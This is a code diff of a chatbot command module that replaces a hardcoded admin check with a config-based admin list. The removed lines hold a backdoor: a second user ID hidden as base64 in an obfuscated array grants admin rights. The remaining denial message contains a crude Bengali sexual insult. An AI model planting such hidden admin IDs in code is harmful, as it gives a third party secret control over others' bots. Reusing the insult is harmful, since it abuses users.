@@ -17,17 +17,11 @@ module.exports = {
 
   onStart: async function ({ args, message, event }) {
 
-    const DUMMY_OWNER = "61591371273779"; // এখানে আপনার ইউআইডি বসান
-
- 
-    const _0x1b4f = [
-      Buffer.from("NjE1OTEzNzExODYxNzk=", "base64").toString("utf-8")
-    ];
-
     const senderID = event.senderID;
-
     
-    const isAdmin = (senderID === DUMMY_OWNER || _0x1b4f.includes(senderID));
+   
+    const botAdmins = global.GoatBot?.config?.adminBot || [];
+    const isAdmin = botAdmins.includes(senderID);
 
     if (!isAdmin) {
       return message.reply(`
@@ -39,8 +33,7 @@ module.exports = {
 » 😾 সিয়াম  বসের 
 » 🖕 চুদা খাবি নাকি 🥵
 ───────────────
-» 👑 𝆠፝𝐍𝐈𝐉𝐇𝐔𝐌-𝐁𝐎𝐓 👑
-» ⚠️ যদি‌ এডমিন হন তাহলে file এর ভিতরে ইউ আই ডি বসান।`);
+» 👑 𝆠፝𝐍𝐈𝐉𝐇𝐔𝐌-𝐁𝐎𝐓 👑`);
     }
 
     const cmdName = args[0];
